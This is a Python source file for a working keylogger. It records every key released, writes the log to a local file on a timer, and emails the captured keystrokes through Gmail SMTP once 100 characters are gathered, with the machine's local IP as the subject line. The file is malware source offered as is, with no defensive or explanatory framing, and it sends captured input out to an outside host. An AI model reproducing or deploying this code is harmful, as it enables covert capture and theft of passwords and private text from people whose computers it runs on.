import keyboard
import smtplib
import socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Semaphore,Timer

YO_TIMER = 10
EMAIL_ADDRESS = "xxxx@gmail.com"
EMAIL_PASSWORD = "xxxxxxx"
local_ip = socket.gethostbyname(socket.gethostname())
msg=MIMEMultipart()
class Yo:
    def __init__(self):
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def write_file(self):
        if self.log:
            with open("tt.txt","w") as f:
                print(self.log,file=f)
        print(self.count_characters())
        # if number of inputs excceds 100 then mail the content
        if (self.count_characters() >= 100):
            with open("tt.txt","r") as f:
                attachment = MIMEText(f.read())
            msg.attach(attachment)
            msg["Subject"] = local_ip
            try:
                with smtplib.SMTP('smtp.gmail.com',587) as smtpObj:
                    smtpObj.starttls()
                    smtpObj.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
                    smtpObj.sendmail(EMAIL_ADDRESS,EMAIL_ADDRESS,msg.as_string())
            except Exception as e:
                print(e)
        self.log = ""
        Timer(interval=YO_TIMER,function=self.write_file).start()

    # Count number of characters from logged file tt.txt
    def count_characters(self):
        with open("tt.txt","r") as f:
            self.text = f.read()
            self.len_chars = sum(len(c) for c in self.text)
            return self.len_chars

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        self.write_file()
        #keyboard.wait()
        self.semaphore.acquire()   #Lock acquire

if __name__ == "__main__":
    yy = Yo()
    yy.start()
